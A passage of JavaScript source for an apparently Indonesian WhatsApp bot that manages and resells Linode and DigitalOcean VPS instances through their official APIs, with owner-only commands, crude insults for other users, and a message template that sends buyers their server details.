      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;
            
            
 case 'linode4gb': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  try {
    let linodeData = {
      label: `${args[0]}`,
      region: 'ap-south', // Ganti dengan region yang diinginkan
      type: 'g6-standard-2', // Spesifikasi 2GB RAM 1 Core CPU
      image: 'linode/ubuntu20.04', // Ganti dengan image yang diinginkan
      root_pass: generateRandomPassword(),
      stackscript_id: null,
      authorized_keys: null,
      backups_enabled: false
    };

    const response = await fetch('https://api.linode.com/v4/linode/instances', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${LINODE_API_TOKEN}`
      },
      body: JSON.stringify(linodeData)
    });

    const responseData = await response.json();

    if (response.ok) {
      const linodeId = responseData.id;

      // Menunggu hingga Linode selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang Linode
      const linodeResponse = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${LINODE_API_TOKEN}`
        }
      });

      const linodeInfo = await linodeResponse.json();
      const ipAddress = linodeInfo.ipv4[0]; // Alamat IP Linode

      let messageText = `Linode berhasil dibuat!\n\n`;
      messageText += `ID: ${linodeId}\n`;
      messageText += `IP Linode: ${ipAddress}\n`;
      messageText += `Password: ${linodeData.root_pass}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat Linode: ${responseData.errors[0].reason}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat Linode: ${err}`);
  }
}
break;

            
case 'saldolinode':
  if (!isCreator) return reply(mess.owner);

  // Endpoint untuk mengambil informasi saldo promosi Linode
  const linodePromotionsEndpoint = 'https://api.linode.com/v4/profile';

  // Konfigurasi untuk melakukan permintaan ke API Linode
  const config = {
    headers: {
      'Authorization': `Bearer ${LINODE_API_TOKEN}`
    }
  };

  // Mengambil informasi saldo promosi dari Linode
  axios.get(linodePromotionsEndpoint, config)
    .then(response => {
      // Periksa apakah saldo promosi tersedia dalam respons
      if (response.data && Array.isArray(response.data.data)) {
        // Saldo promosi dapat ada dalam elemen pertama jika ada
        const saldoPromosi = response.data.data[0].balance;
        const teksSaldo = `Sisa Kredit Promosi Linode Dalam Akun Anda Adalah $${saldoPromosi}`;
        reply(teksSaldo);
      } else {
        reply('Informasi saldo promosi tidak ditemukan atau akun tidak memiliki saldo promosi.');
      }
    })
    .catch(error => {
      console.error(error);
      reply('Terjadi kesalahan saat mengambil informasi saldo promosi.');
    });

  break;




        
case 'resetpassword': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
  let linodeId = args[0];
  let newPassword = args[1];
  
  if (!linodeId || !newPassword) {
    return reply("Format: !resetpassword [Linode ID] [New Password]");
  }
  
  // Periksa apakah kata sandi memenuhi persyaratan keamanan yang diharapkan
  if (newPassword.length < 8) {
    return reply("Kata sandi harus memiliki setidaknya 8 karakter.");
  }
  
  try {
    const resetPassword = async () => {
      try {
        const response = await fetch(`https://api.linode.com/v4/linode/instances/${linodeId}/password`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          },
          body: JSON.stringify({ root_pass: newPassword })
        });
        
        if (response.ok) {
          reply(`Kata sandi VPS Linode ID ${linodeId} berhasil direset.`);
        } else {
          const responseData = await response.json();
          throw new Error(`Gagal mereset kata sandi VPS Linode: ${responseData.errors[0].reason}`);
        }
      } catch (error) {
        reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${error}`);
      }
    };
    
    resetPassword();
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat mereset kata sandi VPS Linode: ${err}`);
  }
}
break;



        
    case 'listlinode': {
  if (!isCreator) return reply("Anda bukan pemilik.");

  try {
    const getLinodes = async () => {
      try {
        const response = await fetch('https://api.linode.com/v4/linode/instances', {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`
          }
        });
        const data = await response.json();
        return data.data || [];
      } catch (error) {
        reply('Error fetching Linodes: ' + error);
        return [];
      }
    };

    getLinodes().then(linodes => {
      let totalvps = linodes.length;
      let message = `List VPS Linode Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (linodes.length === 0) {
        message += 'Tidak ada VPS yang tersedia.';
      } else {
        linodes.forEach(linode => {
          message += `- Linode Id: ${linode.id}\n- Label: ${linode.label}\n- Region: ${linode.region}\n- IP: ${linode.ipv4[0]}\n- Ram: ${linode.specs.memory / 1024} GB\n- Cpu: ${linode.specs.vcpus} CPU\n- Status: ${linode.status}\n- Harga: $\n▬▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      RezzHost.sendMessage(m.chat, { text: message });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data Linode: ' + err);
  }

  break;
}
     
        
 case 'offlinode': {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOffLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/shutdown`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Linode):', error.message);
    }
  }

  turnOffLinode();
  break;
}

case 'onlinode': {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function turnOnLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/boot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang diaktifkan...');
      } else {
        reply('Gagal mengaktifkan VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mengaktifkan VPS (Linode):', error.message);
    }
  }

  turnOnLinode();
  break;
}
case 'rebootlinode': {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let linodeId = args[0];
  if (!linodeId) return reply('ID Linode belum diberikan.');

  async function rebootLinode() {
    try {
      const response = await axios.post(
        `https://api.linode.com/v4/linode/instances/${linodeId}/reboot`,
        {},
        {
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${LINODE_API_TOKEN}`,
          },
        }
      );

      if (response.status === 200) {
        reply('VPS (Linode) sedang direboot...');
      } else {
        reply('Gagal me-reboot VPS (Linode).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat me-reboot VPS (Linode):', error.message);
    }
  }

  rebootLinode();
  break;
}


// BATAS LINODE MENU


// VPS MENU


case 'sisadroplet':{
if (!isCreator) return reply(`Ngapain Woi Tolol Yatim`)
async function getDropletInfo() {
  try {
    const accountResponse = await axios.get('https://api.digitalocean.com/v2/account', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    const dropletsResponse = await axios.get('https://api.digitalocean.com/v2/droplets', {
      headers: {
        Authorization: `Bearer ${API_TOKEN}`,
      },
    });

    if (accountResponse.status === 200 && dropletsResponse.status === 200) {
      const dropletLimit = accountResponse.data.account.droplet_limit;
      const dropletsCount = dropletsResponse.data.droplets.length;
      const remainingDroplets = dropletLimit - dropletsCount;

      return {
        dropletLimit,
        remainingDroplets,
        totalDroplets: dropletsCount,
      };
    } else {
      throw new Error('Gagal mendapatkan data akun DigitalOcean atau droplet.');
    }
  } catch (error) {
    throw error;
  }
}

// Definisikan fungsi untuk mengeksekusi kasus "sisadroplet"
async function sisadropletHandler() {
  try {
    if (!isCreator) {
      return reply2('Lu Siapanya Gua Anjg');
    }

    const dropletInfo = await getDropletInfo();
    reply2(`*Sisa Droplet Yang Dapat Anda Pakai: ${dropletInfo.remainingDroplets}*

*Total Droplet Yang Sudah Terpakai: ${dropletInfo.totalDroplets}*`);
  } catch (error) {
    reply2(`Terjadi kesalahan: ${error.message}`);
  }
}

  sisadropletHandler();
  break;
}
case 'restartvps': {
    if (!isCreator) return reply(`Idih Yatim So Asik Kontol`)
  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  // Fungsi untuk melakukan restart VPS berdasarkan ID droplet
  const restartVPS = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`;

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'reboot'
        })
      });

      if (response.ok) {
        const data = await response.json();
        return data.action;
      } else {
        const errorData = await response.json();
        reply(`Gagal melakukan restart VPS: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan restart VPS:', error.message);
      reply('Terjadi kesalahan saat melakukan restart VPS.');
    }
  };

  restartVPS(dropletId)
    .then((action) => {
      reply(`Aksi restart VPS berhasil dimulai. Status aksi: ${action.status}`);
    })
    .catch((err) => {
      reply(err);
    });

  break;
}
case 'turnoff': {
  if (!isCreator) return reply(`Yatim Kontol Rese`);
  
  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  async function turnOffDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_off',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dimatikan...');
      } else {
        reply('Gagal mematikan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat mematikan VPS (Droplet):', error.message);
    }
  }

  turnOffDroplet();
  break;
}

        
case 'turnon': {
  if (!isCreator) return reply(`Sok Asik Anjg`);
  
  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  async function turnOnDroplet() {
    try {
      const response = await axios.post(
        `https://api.digitalocean.com/v2/droplets/${dropletId}/actions`,
        {
          type: 'power_on',
        },
        {
          headers: {
            'Content-Type': 'application/json',
            Authorization: `Bearer ${API_TOKEN}`,
          },
        }
      );

      if (response.status === 201 && response.data.action && response.data.action.status === 'in-progress') {
        reply('VPS (Droplet) sedang dihidupkan...');
      } else {
        reply('Gagal menghidupkan VPS (Droplet).');
      }
    } catch (error) {
      reply('Terjadi kesalahan saat menghidupkan VPS (Droplet):', error.message);
    }
  }

  turnOnDroplet();
  break;
}
        
        
case 'rebuild': {
  if (!isCreator) return reply2(`Lu Siapanya Gua Anjg Gausah Nyuruh Nyuruh Gua Yatim`);

  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  let rebuildVPS = async () => {
    try {
      // Rebuild droplet menggunakan API DigitalOcean
      const response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}/actions`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        },
        body: JSON.stringify({
          type: 'rebuild',
          image: 'ubuntu-20-04-x64' // Ganti dengan slug image yang ingin digunakan untuk rebuild (misal: 'ubuntu-18-04-x64')
        })
      });

      if (response.ok) {
        const data = await response.json();
        reply('Rebuild VPS berhasil dimulai. Status aksi:', data.action.status);

        // Mendapatkan informasi VPS setelah rebuild
        const vpsInfo = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
          method: 'GET',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${API_TOKEN}`
          }
        });

        if (vpsInfo.ok) {
          const vpsData = await vpsInfo.json();
          const droplet = vpsData.droplet;
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';

          const textvps = `*VPS SUKSES REBUILD*\nIP VPS: ${ipAddress}\nSYSTEM IMAGE: ${droplet.image.slug}`;
          await sleep(60000) 
 RezzHost.sendMessage(m.chat, { text: textvps });
        } else {
          reply('Gagal mendapatkan informasi VPS setelah rebuild.');
        }
      } else {
        const errorData = await response.json();
        reply('Gagal melakukan rebuild VPS:', errorData.message);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat melakukan rebuild VPS:', error);
    }
  };

  rebuildVPS();
}
break;

        case 'deldroplet': {
  if (!isCreator) return reply2('Maaf, command ini hanya untuk pemilik.');

  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  let deleteDroplet = async () => {
    try {
      let response = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'DELETE',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        reply2('Droplet berhasil dihapus.');
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal menghapus droplet: ${errorData.message}`);
      }
    } catch (error) {
      console.error('Terjadi kesalahan saat menghapus droplet:', error);
      reply2('Terjadi kesalahan saat menghapus droplet.');
    }
  };

  deleteDroplet();

  break;
}
case 'listdroplet': {
  if (!isCreator) return reply2("Anda bukan pemilik.");

  try {
    const getDroplets = async () => {
      try {
        const response = await fetch('https://api.digitalocean.com/v2/droplets', {
          headers: {
            Authorization: "Bearer " + API_TOKEN
          }
        });
        const data = await response.json();
        return data.droplets || [];
      } catch (error) {
        reply('Error fetching droplets: ' + error);
        return [];
      }
    };

    getDroplets().then(droplets => {
      let totalvps = droplets.length;
      let mesej = `List Droplet Digital Ocean Anda: ${totalvps}\n\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;

      if (droplets.length === 0) {
        mesej += 'Tidak ada Droplet yang tersedia.';
      } else {
        droplets.forEach(droplet => {
          const ipv4Addresses = droplet.networks.v4.filter(network => network.type === "public");
          const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
          mesej += `- Droplet Id: ${droplet.id}\n- Hostname: ${droplet.name}\n- Username Login: root\n- IP: ${ipAddress}\n- Ram: ${droplet.memory} MB\n- Cpu: ${droplet.vcpus} CPU\n- OS: ${droplet.image.distribution}\n- Storage: ${droplet.disk} GB\n- Status: ${droplet.status}\n▬▭▬▭▬▭▬▭▬▭▬▭▬\n`;
        });
      }
      RezzHost.sendMessage(m.chat, { text: mesej });
    });
  } catch (err) {
    reply('Terjadi kesalahan saat mengambil data droplet: ' + err);
  }

  break;
}
    
 case 'cekdroplet': {
  if (!isCreator) return reply2(`Ngapain? Kepo Amat Dah`);

  let dropletId = args[0];
  if (!dropletId) return reply2('ID droplet belum diberikan.');

  // Mendapatkan informasi droplet (VPS) berdasarkan ID
  const getDropletInfo = async (dropletId) => {
    try {
      const apiUrl = `https://api.digitalocean.com/v2/droplets/${dropletId}`;
      const response = await fetch(apiUrl, {
        headers: {
          'Content-Type': 'application/json',
          'Authorization': `Bearer ${API_TOKEN}`
        }
      });

      if (response.ok) {
        const data = await response.json();
        const droplet = data.droplet;
        const ipv4Addresses = droplet.networks.v4.filter(network => network.type === 'public');
        const ipAddress = ipv4Addresses.length > 0 ? ipv4Addresses[0].ip_address : 'Tidak ada IP';
        const vpsRam = droplet.memory / 1024;

        return {
          dropletid: droplet.id,
          username: droplet.name,
          ip: ipAddress,
          ram: `${vpsRam} GB`,
          os: droplet.image.distribution,
          cpu: droplet.vcpus > 1 ? `${droplet.vcpus} vCPU` : `${droplet.vcpus} vCPUs`,
          storage: droplet.disk,
          status: droplet.status // Menambahkan status VPS
        };
      } else {
        const errorData = await response.json();
        throw new Error(`Gagal memeriksa detail droplet: ${errorData.message}`);
      }
    } catch (error) {
      reply('Terjadi kesalahan saat memeriksa detail droplet:', error.message);
      throw new Error('Terjadi kesalahan saat memeriksa detail droplet.');
    }
  };

  getDropletInfo(dropletId)
    .then((info) => {
      let textku = `*DETAIL VPS ANDA*\nDroplet Id: ${info.dropletid}\nHostname: ${info.username}\nIpv4 : ${info.ip}\nRam : ${info.ram}\nOS : ${info.os}\nCPU: ${info.cpu}\nStorage: ${info.storage}\nStatus : ${info.status}`;
      RezzHost.sendMessage(m.chat, { text: textku });
    })
    .catch((err) => {
      reply(err);
      RezzHost.sendMessage(m.chat, { text: 'Terjadi kesalahan saat memeriksa detail VPS.' });
    });

  break;
}
       
        
    case 'vps1g1c': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply2('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-1gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break

    case 'vps2g1c': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply2('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-1vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break  
 
    case 'vps2g2c': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply2('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-2gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break      
    case 'vps4g2c': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply2('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-2vcpu-4gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break        
     case 'vps8g4c': {
  if (!isCreator) return reply(`Maaf, Command ini Khusus untuk Developer Bot WhatsApp`);
    let hostname = args[0];
  if (!hostname) return reply2('Masukan Hostname Vps.');

  try {
    let dropletData = {
      name: hostname,
      region: 'sgp1',
      size: 's-4vcpu-8gb',
      image: 'ubuntu-20-04-x64',
      ssh_keys: null,
      backups: false,
      ipv6: true,
      user_data: null,
      private_networking: null,
      volumes: null,
      tags: ['T']
    };

    let password = generateRandomPassword();
    dropletData.user_data = `#cloud-config
password: ${password}
chpasswd: { expire: False }`;

    let response = await fetch('https://api.digitalocean.com/v2/droplets', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': "Bearer " + API_TOKEN
      },
      body: JSON.stringify(dropletData)
    });

    let responseData = await response.json();

    if (response.ok) {
      let dropletConfig = responseData.droplet;
      let dropletId = dropletConfig.id;

      // Menunggu hingga VPS selesai dibuat
      reply(`Tunggu Sebentar...`);
      await new Promise(resolve => setTimeout(resolve, 60000));

      // Mengambil informasi lengkap tentang VPS
      let dropletResponse = await fetch(`https://api.digitalocean.com/v2/droplets/${dropletId}`, {
        method: 'GET',
        headers: {
          'Content-Type': 'application/json',
          'Authorization': "Bearer " + API_TOKEN
        }
      });

      let dropletData = await dropletResponse.json();
      // Memeriksa apakah ada alamat IP VPS yang tersedia
      let ipVPS = dropletData.droplet.networks.v4 && dropletData.droplet.networks.v4.length > 0 ? dropletData.droplet.networks.v4[0].ip_address : "Tidak ada alamat IP yang tersedia";

      let messageText = `VPS berhasil dibuat!\n\n`;

      messageText += `ID: ${dropletId}\n`;
      messageText += `IP VPS: ${ipVPS}\n`;
      messageText += `Password: ${password}\n`;

      await RezzHost.sendMessage(m.chat, { text: messageText });
    } else {
      throw new Error(`Gagal membuat VPS: ${responseData.message}`);
    }
  } catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan saat membuat VPS: ${err}`);
  }}
break
case 'svps': case 'sendvps': {
		 if (!isCreator) return (`Ngapain Pea`)
          if (!text) return reply(`Example : ${prefix + command} 6285xxxxx,ip,ram,harga,passwordvps`)
            reply('Pesanan Telah Sukses Dikirim') 
            var mon = args.join(' ')
            var m1 = mon.split(",")[0]
            var m2 = mon.split(",")[1]
            var m3 = mon.split(",")[2]
            var m4 = mon.split(",")[3]
            var m5 = mon.split(",")[4]
                    let mq1 = m1 + '@s.whatsapp.net'
                  let ownernya = owner + '@s.whatsapp.net'
               let me = m.sender
               let ments = [mq1, ownernya, me]
RezzHost.sendMessage(mq1, {text:`
*───❖》${global.owenrname}《❖───*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*📦 Pesananmu Datang 📦*
*Harga : ${m4}*
*Hari : ${hariini}*
*Tanggal : ${tanggal2}*
*Jam : ${time}*
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
*[+] Ip : ${m2}*
*[+] Username : root*
*[+] Password : ${m5}*
*[+] Ram : ${m3}*

*───《TOS VPS》───*

*-JANGAN SAMPAI TERKENA DDOS*
*-JANGAN GUNAKAN UNTUK DDOS*
*-JANGAN GUNAKAN UNTUK MINING*
*-CPU JANGAN SAMPAI 100%*
*-MELANGGAR RULES? GARANSI ANGUS*
*-PANEL SUS NO REFF*`}, m) 
                 }
            break


// BATAS VPS MENU


// PANEL MENU



case 'list-ownpt': case 'listownpt': {   
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})  
let img1 = "https://pomf2.lain.la/f/sni8rsa.png"
async function image(url) {
const { imageMessage } = await generateWAMessageContent({
image: {
url
}}, {
upload: RezzHost.waUploadToServer
})
return imageMessage
}
let msg = generateWAMessageFromContent(
m.chat,
{
viewOnceMessage: {
message: {
interactiveMessage: {
body: {
text: (`*LIST OWN PT PANEL BY ${ownername}*`)  },
carouselMessage: {
cards: [
{
header: {
imageMessage: await image(img1),
hasMediaAttachment: true,
},
body: { text: `*OWN PT 7 DAY*
❖━━━━━━━━━━━━━━━━━━❖
${gris}</> PAKET [ 1 ] </>${gris}

> WAKTU : 7 DAY
> SERVER : PUBLIC

> (IDR) Rp 10.000
❖━━━━━━━━━━━━━━━━━━❖` },
nativeFlowMessage: {
buttons: [
{
